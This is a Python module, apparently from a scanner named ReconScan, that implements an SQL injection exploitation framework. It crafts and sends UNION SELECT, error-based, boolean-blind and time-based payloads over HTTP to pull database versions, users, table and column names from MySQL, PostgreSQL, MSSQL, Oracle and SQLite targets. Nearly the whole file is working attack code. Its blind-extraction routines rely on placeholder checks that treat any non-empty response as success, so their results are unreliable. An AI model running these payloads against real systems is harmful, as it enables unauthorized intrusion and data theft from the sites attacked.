"""
ReconScan SQL Injection Exploitation Framework

Advanced exploitation capabilities for extracting data from confirmed
SQL injection vulnerabilities with support for multiple techniques.
"""

import asyncio
import aiohttp
import string
import time
from typing import Dict, List, Optional, Tuple, Any, Generator
from dataclasses import dataclass
from enum import Enum

from .response_analyzer import DetectionTechnique, DatabaseType
from .sql_payload_crafting_engine import PayloadCraftingEngine, PayloadCraftingContext
from ..shared.injection_discovery import InjectionPoint

class ExploitationTechnique(Enum):
    """Exploitation techniques for data extraction."""
    UNION_SELECT = "union_select"
    BOOLEAN_BLIND = "boolean_blind"  
    TIME_BLIND = "time_blind"
    ERROR_BASED = "error_based"
    STACKED_QUERIES = "stacked_queries"

class ExtractionTarget(Enum):
    """Common data extraction targets."""
    DATABASE_VERSION = "database_version"
    CURRENT_USER = "current_user"
    DATABASE_NAME = "database_name"
    TABLE_NAMES = "table_names"
    COLUMN_NAMES = "column_names"
    USER_DATA = "user_data"
    SCHEMA_INFO = "schema_info"

@dataclass
class ExtractionResult:
    """Result of data extraction attempt."""
    success: bool
    data: Any
    technique_used: ExploitationTechnique
    extraction_time: float
    confidence: float
    raw_responses: List[str]
    metadata: Dict[str, Any]

@dataclass
class ExploitationConfig:
    """Configuration for exploitation attempts."""
    max_extraction_time: float
    max_requests: int
    character_set: str
    blind_delay: float
    timeout: float
    parallel_requests: int
    error_threshold: int

class SQLInjectionExploitationFramework:
    """Advanced framework for exploiting SQL injection vulnerabilities."""
    
    def __init__(self, session: aiohttp.ClientSession):
        """Initialize the exploitation framework."""
        self.session = session
        self.payload_engine = PayloadCraftingEngine()
        
        # Default configuration
        self.default_config = ExploitationConfig(
            max_extraction_time=300.0,  # 5 minutes
            max_requests=1000,
            character_set=string.ascii_letters + string.digits + " ._-@",
            blind_delay=1.0,
            timeout=10.0,
            parallel_requests=3,
            error_threshold=5
        )
        
        # Database-specific queries
        self.extraction_queries = {
            DatabaseType.MYSQL: {
                ExtractionTarget.DATABASE_VERSION: "SELECT @@version",
                ExtractionTarget.CURRENT_USER: "SELECT USER()",
                ExtractionTarget.DATABASE_NAME: "SELECT DATABASE()",
                ExtractionTarget.TABLE_NAMES: "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()",
                ExtractionTarget.COLUMN_NAMES: "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                ExtractionTarget.SCHEMA_INFO: "SELECT schema_name FROM information_schema.schemata"
            },
            DatabaseType.POSTGRESQL: {
                ExtractionTarget.DATABASE_VERSION: "SELECT version()",
                ExtractionTarget.CURRENT_USER: "SELECT current_user",
                ExtractionTarget.DATABASE_NAME: "SELECT current_database()",
                ExtractionTarget.TABLE_NAMES: "SELECT tablename FROM pg_tables WHERE schemaname='public'",
                ExtractionTarget.COLUMN_NAMES: "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                ExtractionTarget.SCHEMA_INFO: "SELECT schema_name FROM information_schema.schemata"
            },
            DatabaseType.MSSQL: {
                ExtractionTarget.DATABASE_VERSION: "SELECT @@version",
                ExtractionTarget.CURRENT_USER: "SELECT SYSTEM_USER",
                ExtractionTarget.DATABASE_NAME: "SELECT DB_NAME()",
                ExtractionTarget.TABLE_NAMES: "SELECT name FROM sysobjects WHERE xtype='U'",
                ExtractionTarget.COLUMN_NAMES: "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                ExtractionTarget.SCHEMA_INFO: "SELECT name FROM sys.databases"
            },
            DatabaseType.ORACLE: {
                ExtractionTarget.DATABASE_VERSION: "SELECT banner FROM v$version WHERE ROWNUM=1",
                ExtractionTarget.CURRENT_USER: "SELECT USER FROM dual",
                ExtractionTarget.DATABASE_NAME: "SELECT sys_context('userenv','db_name') FROM dual",
                ExtractionTarget.TABLE_NAMES: "SELECT table_name FROM user_tables",
                ExtractionTarget.COLUMN_NAMES: "SELECT column_name FROM user_tab_columns WHERE table_name='{table}'",
                ExtractionTarget.SCHEMA_INFO: "SELECT username FROM all_users"
            },
            DatabaseType.SQLITE: {
                ExtractionTarget.DATABASE_VERSION: "SELECT sqlite_version()",
                ExtractionTarget.CURRENT_USER: "SELECT 'sqlite_user'",
                ExtractionTarget.DATABASE_NAME: "SELECT 'main'",
                ExtractionTarget.TABLE_NAMES: "SELECT name FROM sqlite_master WHERE type='table'",
                ExtractionTarget.COLUMN_NAMES: "PRAGMA table_info({table})",
                ExtractionTarget.SCHEMA_INFO: "SELECT name FROM sqlite_master WHERE type='table'"
            }
        }
        
        # Common blind extraction techniques
        self.blind_techniques = {
            'character_by_character': self._extract_character_by_character,
            'binary_search': self._extract_binary_search,
            'length_first': self._extract_length_first
        }
        
    async def exploit_vulnerability(self, 
                                  injection_point: InjectionPoint,
                                  technique: ExploitationTechnique,
                                  extraction_target: ExtractionTarget,
                                  database_type: Optional[DatabaseType] = None,
                                  config: Optional[ExploitationConfig] = None) -> ExtractionResult:
        """Exploit SQL injection to extract data."""
        
        config = config or self.default_config
        start_time = time.time()
        
        try:
            if technique == ExploitationTechnique.UNION_SELECT:
                result = await self._exploit_union_select(
                    injection_point, extraction_target, database_type, config
                )
            elif technique == ExploitationTechnique.ERROR_BASED:
                result = await self._exploit_error_based(
                    injection_point, extraction_target, database_type, config
                )
            elif technique == ExploitationTechnique.BOOLEAN_BLIND:
                result = await self._exploit_boolean_blind(
                    injection_point, extraction_target, database_type, config
                )
            elif technique == ExploitationTechnique.TIME_BLIND:
                result = await self._exploit_time_blind(
                    injection_point, extraction_target, database_type, config
                )
            elif technique == ExploitationTechnique.STACKED_QUERIES:
                result = await self._exploit_stacked_queries(
                    injection_point, extraction_target, database_type, config
                )
            else:
                return ExtractionResult(
                    success=False,
                    data=None,
                    technique_used=technique,
                    extraction_time=0.0,
                    confidence=0.0,
                    raw_responses=[],
                    metadata={'error': 'Unsupported technique'}
                )
            
            result.extraction_time = time.time() - start_time
            return result
            
        except Exception as e:
            return ExtractionResult(
                success=False,
                data=None,
                technique_used=technique,
                extraction_time=time.time() - start_time,
                confidence=0.0,
                raw_responses=[],
                metadata={'error': str(e)}
            )
    
    async def _exploit_union_select(self, 
                                  injection_point: InjectionPoint,
                                  target: ExtractionTarget,
                                  database_type: Optional[DatabaseType],
                                  config: ExploitationConfig) -> ExtractionResult:
        """Exploit using UNION SELECT technique."""
        
        if not database_type or database_type not in self.extraction_queries:
            database_type = DatabaseType.MYSQL  # Default fallback
        
        query = self.extraction_queries[database_type].get(target)
        if not query:
            return ExtractionResult(
                success=False, data=None, technique_used=ExploitationTechnique.UNION_SELECT,
                extraction_time=0.0, confidence=0.0, raw_responses=[],
                metadata={'error': 'No query available for target'}
            )
        
        # Determine column count first
        column_count = await self._determine_column_count(injection_point, config)
        if not column_count:
            return ExtractionResult(
                success=False, data=None, technique_used=ExploitationTechnique.UNION_SELECT,
                extraction_time=0.0, confidence=0.0, raw_responses=[],
                metadata={'error': 'Could not determine column count'}
            )
        
        # Build UNION payload
        null_columns = ",".join(["NULL"] * (column_count - 1))
        if null_columns:
            union_payload = f" UNION SELECT ({query}),{null_columns}--"
        else:
            union_payload = f" UNION SELECT ({query})--"
        
        # Send request
        test_payload = injection_point.original_value + union_payload
        response = await self._send_request(injection_point, test_payload, config)
        
        if response:
            # Extract data from response
            extracted_data = self._extract_data_from_response(response['content'], target)
            
            return ExtractionResult(
                success=bool(extracted_data),
                data=extracted_data,
                technique_used=ExploitationTechnique.UNION_SELECT,
                extraction_time=0.0,
                confidence=0.9 if extracted_data else 0.0,
                raw_responses=[response['content']],
                metadata={'column_count': column_count, 'query': query}
            )
        
        return ExtractionResult(
            success=False, data=None, technique_used=ExploitationTechnique.UNION_SELECT,
            extraction_time=0.0, confidence=0.0, raw_responses=[],
            metadata={'error': 'Request failed'}
        )
    
    async def _exploit_error_based(self, 
                                 injection_point: InjectionPoint,
                                 target: ExtractionTarget,
                                 database_type: Optional[DatabaseType],
                                 config: ExploitationConfig) -> ExtractionResult:
        """Exploit using error-based technique."""
        
        if not database_type or database_type not in self.extraction_queries:
            database_type = DatabaseType.MYSQL  # Default fallback
        
        query = self.extraction_queries[database_type].get(target)
        if not query:
            return ExtractionResult(
                success=False, data=None, technique_used=ExploitationTechnique.ERROR_BASED,
                extraction_time=0.0, confidence=0.0, raw_responses=[],
                metadata={'error': 'No query available for target'}
            )
        
        # Database-specific error-based payloads
        error_payloads = []
        
        if database_type == DatabaseType.MYSQL:
            error_payloads = [
                f" AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))",
                f" AND EXP(~(SELECT * FROM (SELECT ({query}))a))",
                f" AND UPDATEXML(1,CONCAT(0x7e,({query}),0x7e),1)"
            ]
        elif database_type == DatabaseType.POSTGRESQL:
            error_payloads = [
                f" AND CAST(({query}) AS int)",
                f" AND ({query})::int"
            ]
        elif database_type == DatabaseType.MSSQL:
            error_payloads = [
                f" AND CONVERT(int, ({query}))",
                f" AND CAST(({query}) AS int)"
            ]
        
        responses = []
        for payload in error_payloads:
            test_payload = injection_point.original_value + payload
            response = await self._send_request(injection_point, test_payload, config)
            
            if response:
                responses.append(response['content'])
                
                # Look for data in error messages
                extracted_data = self._extract_data_from_error(response['content'], target)
                if extracted_data:
                    return ExtractionResult(
                        success=True,
                        data=extracted_data,
                        technique_used=ExploitationTechnique.ERROR_BASED,
                        extraction_time=0.0,
                        confidence=0.8,
                        raw_responses=responses,
                        metadata={'query': query, 'payload': payload}
                    )
        
        return ExtractionResult(
            success=False, data=None, technique_used=ExploitationTechnique.ERROR_BASED,
            extraction_time=0.0, confidence=0.0, raw_responses=responses,
            metadata={'error': 'No data extracted from errors'}
        )
    
    async def _exploit_boolean_blind(self, 
                                   injection_point: InjectionPoint,
                                   target: ExtractionTarget,
                                   database_type: Optional[DatabaseType],
                                   config: ExploitationConfig) -> ExtractionResult:
        """Exploit using boolean blind technique."""
        
        if not database_type or database_type not in self.extraction_queries:
            database_type = DatabaseType.MYSQL
        
        query = self.extraction_queries[database_type].get(target)
        if not query:
            return ExtractionResult(
                success=False, data=None, technique_used=ExploitationTechnique.BOOLEAN_BLIND,
                extraction_time=0.0, confidence=0.0, raw_responses=[],
                metadata={'error': 'No query available for target'}
            )
        
        # Use different blind extraction techniques
        extraction_methods = [
            ('length_first', self._extract_length_first),
            ('character_by_character', self._extract_character_by_character),
            ('binary_search', self._extract_binary_search)
        ]
        
        responses = []
        for method_name, method_func in extraction_methods:
            try:
                extracted_data = await method_func(
                    injection_point, query, database_type, config, responses
                )
                
                if extracted_data:
                    return ExtractionResult(
                        success=True,
                        data=extracted_data,
                        technique_used=ExploitationTechnique.BOOLEAN_BLIND,
                        extraction_time=0.0,
                        confidence=0.7,
                        raw_responses=responses,
                        metadata={'method': method_name, 'query': query}
                    )
            except Exception as e:
                continue
        
        return ExtractionResult(
            success=False, data=None, technique_used=ExploitationTechnique.BOOLEAN_BLIND,
            extraction_time=0.0, confidence=0.0, raw_responses=responses,
            metadata={'error': 'Blind extraction failed'}
        )
    
    async def _exploit_time_blind(self, 
                                injection_point: InjectionPoint,
                                target: ExtractionTarget,
                                database_type: Optional[DatabaseType],
                                config: ExploitationConfig) -> ExtractionResult:
        """Exploit using time-based blind technique."""
        
        if not database_type or database_type not in self.extraction_queries:
            database_type = DatabaseType.MYSQL
        
        query = self.extraction_queries[database_type].get(target)
        if not query:
            return ExtractionResult(
                success=False, data=None, technique_used=ExploitationTechnique.TIME_BLIND,
                extraction_time=0.0, confidence=0.0, raw_responses=[],
                metadata={'error': 'No query available for target'}
            )
        
        # Implement time-based extraction (simplified)
        extracted_data = await self._extract_time_based(
            injection_point, query, database_type, config
        )
        
        return ExtractionResult(
            success=bool(extracted_data),
            data=extracted_data,
            technique_used=ExploitationTechnique.TIME_BLIND,
            extraction_time=0.0,
            confidence=0.6 if extracted_data else 0.0,
            raw_responses=[],
            metadata={'query': query}
        )
    
    async def _exploit_stacked_queries(self, 
                                     injection_point: InjectionPoint,
                                     target: ExtractionTarget,
                                     database_type: Optional[DatabaseType],
                                     config: ExploitationConfig) -> ExtractionResult:
        """Exploit using stacked queries technique."""
        
        # Stacked queries allow direct command execution
        # This is a high-risk technique that should be used carefully
        
        return ExtractionResult(
            success=False, data=None, technique_used=ExploitationTechnique.STACKED_QUERIES,
            extraction_time=0.0, confidence=0.0, raw_responses=[],
            metadata={'error': 'Stacked queries exploitation not implemented for safety'}
        )
    
    async def _determine_column_count(self, 
                                    injection_point: InjectionPoint,
                                    config: ExploitationConfig) -> Optional[int]:
        """Determine the number of columns for UNION injection."""
        
        for i in range(1, 20):  # Test up to 20 columns
            # Try ORDER BY method
            order_payload = f" ORDER BY {i}--"
            test_payload = injection_point.original_value + order_payload
            
            response = await self._send_request(injection_point, test_payload, config)
            if not response or 'error' in response['content'].lower():
                return i - 1 if i > 1 else None
            
            # Try UNION SELECT method
            null_values = ",".join(["NULL"] * i)
            union_payload = f" UNION SELECT {null_values}--"
            test_payload = injection_point.original_value + union_payload
            
            response = await self._send_request(injection_point, test_payload, config)
            if response and 'error' not in response['content'].lower():
                return i
        
        return None
    
    async def _extract_length_first(self, 
                                  injection_point: InjectionPoint,
                                  query: str,
                                  database_type: DatabaseType,
                                  config: ExploitationConfig,
                                  responses: List[str]) -> Optional[str]:
        """Extract data by first determining length, then characters."""
        
        # Determine length of result
        length = None
        for i in range(1, 100):  # Test up to 100 characters
            length_payload = f" AND LENGTH(({query}))={i}"
            test_payload = injection_point.original_value + length_payload
            
            response = await self._send_request(injection_point, test_payload, config)
            if response:
                responses.append(response['content'])
                # Assume true condition if response is similar to baseline
                # This is simplified - real implementation would need baseline comparison
                if len(response['content']) > 0:  # Placeholder logic
                    length = i
                    break
        
        if not length:
            return None
        
        # Extract character by character
        extracted = ""
        for pos in range(1, length + 1):
            for char in config.character_set:
                char_payload = f" AND ASCII(SUBSTRING(({query}),{pos},1))={ord(char)}"
                test_payload = injection_point.original_value + char_payload
                
                response = await self._send_request(injection_point, test_payload, config)
                if response:
                    responses.append(response['content'])
                    # Placeholder logic for character detection
                    if len(response['content']) > 0:
                        extracted += char
                        break
        
        return extracted if extracted else None
    
    async def _extract_character_by_character(self, 
                                            injection_point: InjectionPoint,
                                            query: str,
                                            database_type: DatabaseType,
                                            config: ExploitationConfig,
                                            responses: List[str]) -> Optional[str]:
        """Extract data character by character without knowing length."""
        
        extracted = ""
        position = 1
        
        while position <= 50:  # Limit to 50 characters
            char_found = False
            
            for char in config.character_set:
                char_payload = f" AND ASCII(SUBSTRING(({query}),{position},1))={ord(char)}"
                test_payload = injection_point.original_value + char_payload
                
                response = await self._send_request(injection_point, test_payload, config)
                if response:
                    responses.append(response['content'])
                    # Simplified detection logic
                    if len(response['content']) > 0:
                        extracted += char
                        char_found = True
                        break
            
            if not char_found:
                break
                
            position += 1
        
        return extracted if extracted else None
    
    async def _extract_binary_search(self, 
                                   injection_point: InjectionPoint,
                                   query: str,
                                   database_type: DatabaseType,
                                   config: ExploitationConfig,
                                   responses: List[str]) -> Optional[str]:
        """Extract data using binary search optimization."""
        
        # Simplified binary search implementation
        # Real implementation would use binary search for ASCII values
        return await self._extract_character_by_character(
            injection_point, query, database_type, config, responses
        )
    
    async def _extract_time_based(self, 
                                injection_point: InjectionPoint,
                                query: str,
                                database_type: DatabaseType,
                                config: ExploitationConfig) -> Optional[str]:
        """Extract data using time-based blind technique."""
        
        # Time-based extraction is complex and slow
        # This is a simplified placeholder implementation
        
        delay_payload = f" AND IF(LENGTH(({query}))>0,SLEEP({config.blind_delay}),0)"
        test_payload = injection_point.original_value + delay_payload
        
        start_time = time.time()
        response = await self._send_request(injection_point, test_payload, config)
        elapsed = time.time() - start_time
        
        if elapsed >= config.blind_delay:
            return "time_based_extraction_success"  # Placeholder
        
        return None
    
    async def _send_request(self, 
                          injection_point: InjectionPoint,
                          payload: str,
                          config: ExploitationConfig) -> Optional[Dict[str, Any]]:
        """Send HTTP request with payload."""
        
        try:
            if injection_point.method.upper() == 'GET':
                url = f"{injection_point.url}?{injection_point.parameter}={payload}"
                async with self.session.get(url, 
                                          timeout=aiohttp.ClientTimeout(total=config.timeout)) as response:
                    content = await response.text()
                    return {
                        'content': content,
                        'status_code': response.status,
                        'headers': dict(response.headers)
                    }
            
            elif injection_point.method.upper() == 'POST':
                data = {injection_point.parameter: payload}
                async with self.session.post(injection_point.url, data=data,
                                           timeout=aiohttp.ClientTimeout(total=config.timeout)) as response:
                    content = await response.text()
                    return {
                        'content': content,
                        'status_code': response.status,
                        'headers': dict(response.headers)
                    }
                    
        except Exception:
            return None
    
    def _extract_data_from_response(self, content: str, target: ExtractionTarget) -> Optional[str]:
        """Extract relevant data from response content."""
        
        # Patterns for different data types
        patterns = {
            ExtractionTarget.DATABASE_VERSION: [
                r'(\d+\.\d+\.\d+)',  # Version numbers
                r'MySQL (\d+\.\d+)',
                r'PostgreSQL (\d+\.\d+)',
                r'Microsoft SQL Server (\d+\.\d+)'
            ],
            ExtractionTarget.CURRENT_USER: [
                r'root@localhost',
                r'postgres',
                r'sa',
                r'admin',
                r'[a-zA-Z0-9_]+@[a-zA-Z0-9_]+'
            ],
            ExtractionTarget.DATABASE_NAME: [
                r'[a-zA-Z0-9_]+_db',
                r'information_schema',
                r'mysql',
                r'postgres',
                r'master'
            ]
        }
        
        target_patterns = patterns.get(target, [r'[a-zA-Z0-9_]+'])
        
        import re
        for pattern in target_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                return matches[0] if isinstance(matches[0], str) else str(matches[0])
        
        return None
    
    def _extract_data_from_error(self, content: str, target: ExtractionTarget) -> Optional[str]:
        """Extract data from error messages."""
        
        # Look for data between common error delimiters
        import re
        
        error_patterns = [
            r'~([^~]+)~',  # Data between tildes
            r'\'([^\']+)\'',  # Data in single quotes
            r'"([^"]+)"',  # Data in double quotes
            r'value \'([^\']+)\'',  # Error value patterns
            r'convert.*\'([^\']+)\''  # Convert error patterns
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                # Filter out common SQL keywords
                sql_keywords = ['select', 'from', 'where', 'and', 'or', 'null', 'int', 'varchar']
                for match in matches:
                    if match.lower() not in sql_keywords and len(match) > 2:
                        return match
        
        return None
    
    async def get_exploitation_info(self, 
                                  database_type: Optional[DatabaseType],
                                  technique: ExploitationTechnique) -> Dict[str, Any]:
        """Get information about exploitation capabilities."""
        
        info = {
            'technique': technique.value,
            'database_type': database_type.value if database_type else 'unknown',
            'available_targets': [],
            'estimated_success_rate': 0.0,
            'recommended_payloads': []
        }
        
        if database_type in self.extraction_queries:
            info['available_targets'] = list(self.extraction_queries[database_type].keys())
        
        # Estimate success rates based on technique
        success_rates = {
            ExploitationTechnique.UNION_SELECT: 0.9,
            ExploitationTechnique.ERROR_BASED: 0.8,
            ExploitationTechnique.BOOLEAN_BLIND: 0.6,
            ExploitationTechnique.TIME_BLIND: 0.5,
            ExploitationTechnique.STACKED_QUERIES: 0.7
        }
        
        info['estimated_success_rate'] = success_rates.get(technique, 0.3)
        
        return info 